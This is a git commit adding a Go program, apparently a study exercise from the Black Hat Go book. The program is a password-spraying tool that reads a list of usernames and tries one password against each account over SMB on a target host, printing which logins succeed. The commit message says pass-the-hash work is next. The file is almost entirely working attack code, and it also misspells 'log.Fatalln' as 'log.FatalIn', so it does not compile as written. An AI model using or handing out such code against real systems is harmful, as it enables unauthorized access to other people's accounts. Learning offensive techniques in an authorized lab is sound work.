5ae689336e1cc9c5ac7e8564b5ca75589f20f3dd
atphinn <18540847+atphinn@users.noreply.github.com>
2022-01-27 22:33:45 -0500

    Finished Password guesser, working on passing the hash

---
+++ ch6/Password-gussing/main.go
@@ -0,0 +1,43 @@
+package main
+
+import (
+	"bytes"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"os"
+
+	"github.com/blackhat-go/bhg/ch-6/smb/smb"
+)
+
+func main() {
+	if len(os.Args) != 5 {
+		log.FatalIn("Usage: main </user/file> <password> <domain> <target host>")
+	}
+
+	buf, err := ioutil.ReadFile(os.Args[1])
+	if err != nil {
+		log.FatalIn(err)
+	}
+
+	options := smb.Options{
+		Password: os.Args[2],
+		Domain:   os.Args[3],
+		Host:     os.Args[4],
+		Port:     445,
+	}
+
+	users := bytes.Split(buf, []byte{'\n'})
+	for _, user := range users {
+		options.User = string(user)
+		session, err := smb.NewSession(options, false)
+		if err != nil {
+			fmt.Printf("[-] Login failed: %s\\%s[%s]\n", options.Domain, options.User, options.Password)
+			continue
+		}
+		defer session.Close()
+		if session.IsAuthenticated {
+			fmt.Printf("[+] Success :%s\\%s[%s]\n", options.Domain, options.User, options.Password)
+		}
+	}
+}
